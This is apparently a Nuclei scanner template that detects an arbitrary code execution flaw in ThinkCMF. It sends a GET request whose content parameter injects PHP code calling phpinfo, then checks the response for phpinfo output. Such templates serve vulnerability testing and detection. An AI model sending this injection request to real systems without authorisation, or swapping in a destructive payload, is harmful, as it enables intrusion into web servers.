id: thinkcmf-arbitrary-code-execution
info:
  author: pikpikcu
  name: ThinkCMF Arbitrary code execution
  reference:
  - https://www.shuzhiduo.com/A/l1dygr36Je/
  severity: high
  tags: thinkcmf
requests:
- matchers:
  - condition: and
    type: word
    words:
    - PHP Extension
    - PHP Version
    - PHP License
    - PHP Variables
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/index.php?g=g&m=Door&a=index&content=<?php%20phpinfo();'
